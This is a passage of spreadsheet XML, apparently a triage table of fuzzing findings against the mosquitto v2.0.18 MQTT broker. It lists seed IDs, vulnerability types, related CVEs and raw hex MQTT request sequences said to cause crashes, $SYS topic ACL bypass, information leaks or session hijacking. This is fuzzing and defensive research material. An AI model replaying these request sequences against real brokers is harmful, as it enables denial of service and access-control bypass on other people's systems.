      <c r="D3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将种子文件(id:000008,sev:3,cat:000a)中的REQUEST DATA提取出来(217B)\u000a4.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52" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:000a ===\u000a大小: 594B (报告+请求数据)\u000a请求数据: 217B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(217B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=49664 Topics=[] | raw_header=8259c2003c0000000966753c00000009\u000aMsg[2]: PUBREL PacketID=25964 | raw_header=6576656c332f6c6576656c340009612f\u000aMsg[3]: (不完整,6B) raw=276dc000e000\u000a(尾部6B): 276dc000e000</f>
        <v/>
      </c>
      <c r="F3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5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52" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J35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5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53">
      <c r="A353" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B353" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C353" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(98B)\u000a4.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53" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 698B (报告+请求数据)\u000a请求数据: 98B\u000a\u000a---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MQTT请求序列(98B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=78 Topics=['#'(QoS=0), '$share/grp/test/topic'(QoS=1), '$SYS/broker/version'(QoS=0)] | raw_header=8234004e000123000015247368617265\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload='#\x19yL$' | raw_header=3924001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,6B) raw=642d0001d202\u000a(尾部6B): 642d0001d202</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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5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54">
      <c r="A354" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B354" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C354" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(103B)\u000a4.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354" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 567B (报告+请求数据)\u000a请求数据: 103B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(103B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v130 ClientID=''(25B) clean_session=False keepalive=22s [持久会话] | raw_header=100c000082180016000019310674\u000aMsg[2]: (不完整,89B) raw=6585742f23003c000766757a7a5f6331820b00010006746573742f2300340f0006746573742f6100\u000a(尾部89B): 6585742f23003c000766757a7a5f6331820b00010006746573742f2300340f0006746573742f6100ff001700052b2f2b2f2b</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J35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5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55">
      <c r="A355" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:3,cat:020e</t>
        </is>
      </c>
      <c r="B355" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C355" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000008,sev:3,cat:020e)中的REQUEST DATA提取出来(13B)\u000a4.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355" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:020e ===\u000a大小: 552B (报告+请求数据)\u000a请求数据: 13B\u000a\u000a---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MQTT请求序列(13B原始二进制) ---\u000aMsg[1]: (不完整,13B) raw=8a1700030012245359532f2300\u000a(尾部13B): 8a1700030012245359532f2300</f>
        <v/>
      </c>
      <c r="F3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5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55" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J35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5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56">
      <c r="A356" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B356" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C356" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(139B)\u000a4.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356" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 1521B (报告+请求数据)\u000a请求数据: 139B\u000a\u000a---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MQTT请求序列(139B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1013001c4d51e4dff354540402000054\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=86B | raw_header=356b0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,9B) raw=00ebf2546665665fa5\u000a(尾部9B): 00ebf2546665665fa5</f>
        <v/>
      </c>
      <c r="F3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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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5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57">
      <c r="A357" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B357" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C357" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(2120B)\u000a4.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357" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0385 ===\u000a大小: 3366B (报告+请求数据)\u000a请求数据: 2120B\u000a\u000a---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MQTT请求序列(2120B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQ\x00\u0009 v116 ClientID=''(18B) clean_session=False keepalive=29472s Will=YES [持久会话] | raw_header=101300044d5100097465732000001230\u000aMsg[2]: TYPE0  | raw_header=0100\u000aMsg[3]: TYPE0  | raw_header=067465820b0001010006ff6101000674\u000aMsg[4]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[5]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[6]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[7]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[8]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[9]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[10]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[11]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[12]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[13]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[14]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[15]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[16]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[17]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[18]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[19]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[20]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[21]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[22]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[23]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[24]: TYPE0  | raw_header=0909090909090909090909\u000aMsg[25]: TYPE0  | raw_header=09160909090909090909090909090909\u000a(尾部1724B): 0909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909</f>
        <v/>
      </c>
      <c r="F3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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J35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5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58">
      <c r="A358" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B358" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C358" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(79B)\u000a4.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58" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 544B (报告+请求数据)\u000a请求数据: 79B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(79B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=102d9440842f362f2f70023900212f2f\u000aMsg[2]: SUBSCRIBE PacketID=25 Topics=[''(零长度!QoS=0)] | raw_header=820b001900008000ffffff8023\u000aMsg[3]: (不完整,19B) raw=003d2f212f2f2f00008218ef00000e00649ade\u000a(尾部19B): 003d2f212f2f2f00008218ef00000e00649ade</f>
        <v/>
      </c>
      <c r="F3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58" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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5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59">
      <c r="A359" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B359" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C359" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(216B)\u000a4.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59" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 828B (报告+请求数据)\u000a请求数据: 216B\u000a\u000a---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MQTT请求序列(216B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=2 | raw_header=60020002\u000aMsg[2]: UNSUBSCRIBE  | raw_header=a20a00030006740000000000\u000aMsg[3]: SUBSCRIBE PacketID=58 Topics=[''(零长度!QoS=2)] | raw_header=8238003a0000122473686172652f6772\u000aMsg[4]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload_len=107B | raw_header=388a01001d245359532f62726f6b6572\u000aMsg[5]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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5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60">
      <c r="A360" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:004a</t>
        </is>
      </c>
      <c r="B360" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C360" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000008,sev:4,cat:004a)中的REQUEST DATA提取出来(275B)\u000a4.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0x004a\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E360" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:004a ===\u000a大小: 850B (报告+请求数据)\u000a请求数据: 275B\u000a\u000a---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CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(275B原始二进制) ---\u000aMsg[1]: (不完整,275B) raw=82823400dd0000001c002b766572792f646565702f746f7069632f6c6576656c312f6c6576656c32\u000a(尾部275B): 82823400dd0000001c002b766572792f646565702f746f7069632f6c6576656c312f6c6576656c322f6c6576656c332f6c65</f>
        <v/>
      </c>
      <c r="F3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6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60" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J36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6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61">
      <c r="A361" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B361" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C361" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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61" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 820B (报告+请求数据)\u000a请求数据: 166B\u000a\u000a---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MQTT请求序列(166B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=2 | raw_header=70020002\u000aMsg[2]: UNSUBSCRIBE  | raw_header=a20a17030006746573742f23\u000aMsg[3]: PINGREQ  | raw_header=c000\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[5]: SUBSCRIBE PacketID=4841 Topics=[''(零长度!QoS=2)] | raw_header=823512e90000062b2f6461746114001d\u000aMsg[6]: PUBLISH Topic='test/topic' QoS=1 retain=True payload_len=77B | raw_header=3359000a746573742f746f70696312ea</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J36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6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62">
      <c r="A362" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B362" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C362" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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62" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 937B (报告+请求数据)\u000a请求数据: 138B\u000a\u000a---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MQTT请求序列(138B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=21 Topics=[''(零长度!QoS=1)] | raw_header=82320015000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload='\x00\x16\x03#\x19\x1f' | raw_header=3525001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,47B) raw=444d5154540400003c000d706572730100000064745f3031820b6f733200027061806c6f61646f61\u000a(尾部47B): 444d5154540400003c000d706572730100000064745f3031820b6f733200027061806c6f61646f61644b02b2027002</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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6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63">
      <c r="A363" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:01c0</t>
        </is>
      </c>
      <c r="B363" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C363" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(98B)\u000a4.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363" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c0 ===\u000a大小: 903B (报告+请求数据)\u000a请求数据: 98B\u000a\u000a---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MQTT请求序列(98B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=100c00044d5154540402003c0000\u000aMsg[2]: SUBSCRIBE PacketID=22 Topics=['a/c/c/d/e/f/g/h/i/j'(QoS=0)] | raw_header=821800160013612f632f632f642f652f\u000aMsg[3]: SUBSCRIBE PacketID=23 Topics=['+/+/+'(QoS=1)] | raw_header=820a001700052b2f2b2f2b01\u000aMsg[4]: SUBSCRIBE PacketID=24 Topics=['#'(QoS=2)] | raw_header=8206001800012302\u000aMsg[5]: SUBSCRIBE PacketID=16 Topics=[''(零长度!QoS=0)] | raw_header=820b00100000746573742f2300\u000aMsg[6]: PUBLISH Topic='test/topic' QoS=1 retain=True payload='\x00\x1ahello' | raw_header=3313000a746573742f746f706963001a\u000aMsg[7]: PINGREQ  | raw_header=c000\u000aMsg[8]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J36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6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64">
      <c r="A364" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B364" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C364" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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64" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 889B (报告+请求数据)\u000a请求数据: 260B\u000a\u000a---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MQTT请求序列(260B原始二进制) ---\u000aMsg[1]: (不完整,260B) raw=818240000100000d2473686172652f677270312f231600122473686172652f677270312f74657374\u000a(尾部260B): 818240000100000d2473686172652f677270312f231600122473686172652f677270312f746573742f2b1600152473686172</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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6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65">
      <c r="A365" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B365" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C365" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(34B)\u000a4.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65" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 1280B (报告+请求数据)\u000a请求数据: 34B\u000a\u000a---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MQTT请求序列(34B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=73 Topics=[''(零长度!QoS=1)] | raw_header=822000490000017426000a746573742f</f>
        <v/>
      </c>
      <c r="F3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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J36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6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66">
      <c r="A366" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B366" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C366" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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366" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c6 ===\u000a大小: 1482B (报告+请求数据)\u000a请求数据: 90B\u000a\u000a---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MQTT请求序列(90B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=51 Topics=['+/data'(QoS=2), ''(零长度!QoS=0)] | raw_header=820e003300062b2f6461746102000000\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload='\x97\x1aÒVAß»Ö\u000a\x16ñ' | raw_header=38200013245359532f62726f6b65722f\u000aMsg[3]: (不完整,40B) raw=10fa43512e236166806e65741f66757a7a820f001a000a7b2274656d70223a32512e237dc000e000\u000a(尾部40B): 10fa43512e236166806e65741f66757a7a820f001a000a7b2274656d70223a32512e237dc000e000</f>
        <v/>
      </c>
      <c r="F3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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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6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67">
      <c r="A367" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B367" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C367" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D3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67" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 550B (报告+请求数据)\u000a请求数据: 70B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(70B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v116 ClientID=''(21337B) clean_session=False keepalive=29s Will=YES [持久会话] | raw_header=101500044d515454740c001d24535953\u000aMsg[2]: (不完整,47B) raw=2f636c69656e74732f636f6e6e65637465641a3d8700012365732b2f2301320f0006749b738b2f62\u000a(尾部47B): 2f636c69656e74732f636f6e6e65637465641a3d8700012365732b2f2301320f0006749b738b2f62000a776f720132</f>
        <v/>
      </c>
      <c r="F3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7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67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67" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J367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36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68">
      <c r="A368" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B368" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C368" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(69B)\u000a4.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68" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 542B (报告+请求数据)\u000a请求数据: 69B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(69B原始二进制) ---\u000aMsg[1]: CONNECT Proto=\x01QTT v231 ClientID=''(26220B) clean_session=True keepalive=60s [自动清理会话] | raw_header=1015000401515454e702003cfff66166\u000aMsg[2]: SUBACK PacketID=33023 reason_codes=[255,255,0,112,116,105,109,101,2] | raw_header=900b80ffffff007074696d6502\u000aMsg[3]: SUBSCRIBE PacketID=4 Topics=['$SYS/#'(QoS=3)] | raw_header=820b00040006245359532f2303\u000aMsg[4]: (不完整,20B) raw=a2150005001173656e736f722f74656d6f6f6f01\u000a(尾部20B): a2150005001173656e736f722f74656d6f6f6f01</f>
        <v/>
      </c>
      <c r="F3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6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68" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J36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6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69">
      <c r="A369" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B369" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C369" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(156B)\u000a4.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69" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 804B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MQTT请求序列(156B原始二进制) ---\u000aMsg[1]: (不完整,156B) raw=3d8228008e050ba6c6900f001d245359532f62726f6b65722f636c69656e74732f636f6e6e656374\u000a(尾部156B): 3d8228008e050ba6c6900f001d245359532f62726f6b65722f636c69656e74732f636f6e6e6563746564043b6f000a746573</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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70">
      <c r="A370" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:008a</t>
        </is>
      </c>
      <c r="B370" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C370" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(681B)\u000a4.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370" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:008a ===\u000a大小: 3380B (报告+请求数据)\u000a请求数据: 681B\u000a\u000a---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MQTT请求序列(681B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTÿ v0 ClientID='aflnEtoTÿ'(9B) clean_session=False keepalive=60s [持久会话] | raw_header=121500044d5154ff0000003c00096166\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: TYPE0  | raw_header=003c000961666c6e45746f6330825265\u000aMsg[4]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=312f6c6576106c322f820080656c332f\u000aMsg[5]: TYPE0  | raw_header=0002a20a\u000aMsg[6]: TYPE0  | raw_header=0003000674\u000aMsg[7]: PUBREL PacketID=29743 | raw_header=6573742f23822500290013245359532f\u000aMsg[8]: PUBREL PacketID=29811 | raw_header=656e74732f636f6e6e65637465640135\u000aMsg[9]: CONNACK session_present=101 reason_code=114 | raw_header=2b76657274696f6e63308252656c6c6f\u000aMsg[10]: PUBREL PacketID=256 | raw_header=6f6e01000a746573962b936f70696300\u000aMsg[11]: (不完整,75B) raw=65656565656565656565656565656565656565656565656565656565656565656565656565656565\u000a(尾部75B): 6565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565</f>
        <v/>
      </c>
      <c r="F3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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J37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7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71">
      <c r="A371" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B371" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C371" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(1898B)\u000a4.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71" s="2">
